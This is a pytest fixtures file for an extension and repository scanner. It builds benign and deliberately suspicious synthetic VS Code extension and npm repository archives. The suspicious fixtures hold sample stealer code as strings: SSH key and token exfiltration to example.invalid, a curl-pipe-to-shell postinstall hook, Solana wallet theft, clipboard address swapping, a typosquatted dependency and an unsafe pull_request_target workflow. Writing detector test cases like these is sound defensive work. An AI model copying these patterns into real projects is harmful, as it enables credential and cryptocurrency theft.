from __future__ import annotations

import io
import base64
import json
import zipfile
from pathlib import Path
from typing import Mapping

import pytest

VALID_SHA512 = "sha512-" + base64.b64encode(bytes(64)).decode("ascii")


def build_vsix(files: Mapping[str, bytes | str]) -> bytes:
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        for name, content in files.items():
            archive.writestr(name, content)
    return output.getvalue()


def manifest(*, main: str = "./dist/extension.js") -> str:
    return json.dumps(
        {
            "name": "synthetic-safe-extension",
            "displayName": "Synthetic Safe Extension",
            "publisher": "extension-xray",
            "version": "1.0.0",
            "description": "A deterministic fixture used by Extension X-Ray tests.",
            "engines": {"vscode": "^1.90.0"},
            "activationEvents": ["onCommand:xray.hello"],
            "main": main,
            "contributes": {
                "commands": [{"command": "xray.hello", "title": "Say hello"}]
            },
        }
    )


@pytest.fixture
def benign_vsix(tmp_path: Path) -> Path:
    path = tmp_path / "benign.vsix"
    path.write_bytes(
        build_vsix(
            {
                "extension/package.json": manifest(),
                "extension/dist/extension.js": (
                    "const vscode = require('vscode');\n"
                    "const benignMatch = /hello/.exec('hello');\n"
                    "function activate(context) {\n"
                    "  context.subscriptions.push(vscode.commands.registerCommand('xray.hello', () => 'hello'));\n"
                    "}\nexports.activate = activate;\n"
                ),
                "extension/README.md": "# Benign synthetic extension\n",
                "[Content_Types].xml": "<Types></Types>",
            }
        )
    )
    return path


@pytest.fixture
def suspicious_vsix(tmp_path: Path) -> Path:
    path = tmp_path / "suspicious.vsix"
    path.write_bytes(
        build_vsix(
            {
                "extension/package.json": manifest(),
                "extension/dist/extension.js": (
                    "const cp = require('child_process');\n"
                    "const fs = require('fs');\n"
                    "async function inspect() {\n"
                    "  const token = process.env.SYNTHETIC_TOKEN;\n"
                    "  const key = fs.readFileSync('/tmp/.ssh/id_rsa', 'utf8');\n"
                    "  await fetch('https://example.invalid/demo', {method: 'POST', body: token + key});\n"
                    "  cp.exec('echo synthetic-demo');\n"
                    "  eval('1 + 1');\n"
                    "}\nexports.inspect = inspect;\n"
                ),
            }
        )
    )
    return path


@pytest.fixture
def benign_repository(tmp_path: Path) -> Path:
    path = tmp_path / "benign-repository.zip"
    package = json.dumps(
        {
            "name": "benign-repository",
            "version": "1.0.0",
            "description": "Synthetic benign repository fixture.",
            "scripts": {"test": "vitest --run"},
            "dependencies": {"kleur": "4.1.5"},
        }
    )
    pinned_sha = "a" * 40
    path.write_bytes(
        build_vsix(
            {
                "benign-repository/package.json": package,
                "benign-repository/package-lock.json": json.dumps(
                    {
                        "name": "benign-repository",
                        "version": "1.0.0",
                        "lockfileVersion": 3,
                        "packages": {
                            "": {
                                "name": "benign-repository",
                                "version": "1.0.0",
                                "dependencies": {"kleur": "4.1.5"},
                            },
                            "node_modules/kleur": {
                                "version": "4.1.5",
                                "resolved": "https://registry.npmjs.org/kleur/-/kleur-4.1.5.tgz",
                                "integrity": f"{VALID_SHA512} sha1-Zm9v",
                            },
                        },
                    }
                ),
                "benign-repository/src/index.js": "export const greet = (name) => `hello ${name}`;\n",
                "benign-repository/.github/workflows/test.yml": (
                    "name: test\non: [push]\njobs:\n  test:\n    runs-on: ubuntu-latest\n"
                    f"    steps:\n      - uses: actions/checkout@{pinned_sha}\n"
                ),
            }
        )
    )
    return path


@pytest.fixture
def suspicious_repository(tmp_path: Path) -> Path:
    path = tmp_path / "suspicious-repository.zip"
    package = json.dumps(
        {
            "name": "synthetic-crypto-stealer-patterns",
            "version": "0.0.0",
            "description": "Defensive synthetic patterns; never execute.",
            "scripts": {
                "postinstall": "curl https://example.invalid/install.sh | sh",
                "test": "node scripts/bootstrap.js",
            },
            "dependencies": {
                "elliptic": "6.5.3",
                "lodahs": "4.17.21",
                "remote-tool": "https://example.invalid/remote-tool.tgz",
            },
        },
        indent=2,
    )
    source = """// Defensive fixture only. No real secrets or live destination.
const fs = require('fs');
const cp = require('child_process');
async function inspect() {
  const wallet = fs.readFileSync(process.env.HOME + '/.config/solana/id.json');
  const packedWallet = Buffer.from(wallet).toString('base64');
  await fetch('https://example.invalid/collect', {method: 'POST', body: packedWallet});
  const current = await navigator.clipboard.readText();
  if (/^0x/.test(current)) await navigator.clipboard.writeText('0x1111111111111111111111111111111111111111');
  const injectedKey = process.env.WALLET_PRIVATE_KEY;
  cp.execFile('synthetic-tool', ['--key', injectedKey]);
}
exports.inspect = inspect;
"""
    workflow = """name: unsafe synthetic example
on: pull_request_target
jobs:
  test:
    permissions: write-all
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm test
"""
    path.write_bytes(
        build_vsix(
            {
                "repo/package.json": package,
                "repo/package-lock.json": json.dumps(
                    {
                        "name": "synthetic-crypto-stealer-patterns",
                        "version": "0.0.0",
                        "lockfileVersion": 3,
                        "packages": {
                            "": {
                                "name": "synthetic-crypto-stealer-patterns",
                                "version": "0.0.0",
                                "dependencies": {
                                    "elliptic": "6.5.3",
                                    "lodahs": "4.17.21",
                                    "remote-tool": "https://example.invalid/remote-tool.tgz",
                                },
                            },
                            "node_modules/elliptic": {
                                "version": "6.5.3",
                                "resolved": "https://registry.npmjs.org/elliptic/-/elliptic-6.5.3.tgz",
                                "integrity": VALID_SHA512,
                            },
                            "node_modules/lodahs": {
                                "version": "4.17.21",
                                "resolved": "https://registry.npmjs.org/lodahs/-/lodahs-4.17.21.tgz",
                                "hasInstallScript": True,
                            },
                            "node_modules/remote-tool": {
                                "version": "1.0.0",
                                "resolved": "https://example.invalid/remote-tool-1.0.0.tgz",
                                "integrity": VALID_SHA512,
                            },
                        },
                    },
                    indent=2,
                ),
                "repo/scripts/bootstrap.js": source,
                "repo/config/example.js": (
                    "const mnemonic = 'synthetic alpha beta gamma delta epsilon zeta eta theta iota kappa lambda';\n"
                ),
                "repo/config/encoded.js": (
                    "const privateKey = '" + ("a" * 64) + "';\n"
                ),
                "repo/.github/workflows/unsafe.yml": workflow,
                "repo/.vscode/tasks.json": json.dumps(
                    {"version": "2.0.0", "tasks": [{"type": "shell", "command": "npm test"}]}
                ),
                "repo/.devcontainer/devcontainer.json": json.dumps(
                    {"name": "demo", "postCreateCommand": "npm install"}
                ),
            }
        )
    )
    return path

